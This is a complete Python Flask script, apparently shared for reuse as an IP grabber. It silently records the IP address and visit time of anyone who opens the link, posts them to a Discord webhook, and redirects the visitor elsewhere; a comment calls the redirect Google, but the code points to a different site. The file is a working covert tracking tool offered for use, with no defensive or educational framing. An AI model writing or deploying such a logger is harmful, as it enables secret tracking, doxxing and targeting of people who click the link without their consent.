from flask import Flask, request, redirect
from datetime import datetime
import requests

app = Flask(__name__)

# Function to send IP and timestamp to the Discord webhook
def send_ip_to_webhook(ip, date):
    webhook_url = "PASTE YOUR WEBHOOK HERE"

    # Prepare the data for the webhook
    data = {
        "content": "",
        "embeds": [
            {
                "title": "Made by viktor enjoy :)",
                "fields": [
                    {"name": "IP Address", "value": ip, "inline": False},
                    {"name": "Timestamp", "value": date, "inline": False}
                ]
            }
        ]
    }

    # Send the webhook request and log the result
    try:
        response = requests.post(webhook_url, json=data)
        print(f"Webhook response: {response.status_code}, Response text: {response.text}")  # Log the response
        return response.status_code == 200
    except requests.exceptions.RequestException as e:
        print(f"Error sending webhook request: {e}")
        return False

# Route to handle the main functionality
@app.route("/")
def index():
    # Grab the IP address from the 'X-Forwarded-For' header or fallback to remote_addr
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")

    print(f"IP pulled: {ip}, Date: {date}")  # Log the pulled IP and date for debugging

    if not ip:
        print("Error: IP address not found")
        return "Error: IP address not found", 400  # Return an error if IP is not found

    # Send IP and timestamp to the Discord webhook
    if send_ip_to_webhook(ip, date):
        print("Webhook sent successfully!")
    else:
        print("Failed to send webhook.")

    # Redirect to Google
    return redirect("https://fatality.win")

if __name__ == "__main__":
    # Run the app without specifying a port (PythonAnywhere handles the port automatically)
    app.run(host="0.0.0.0")
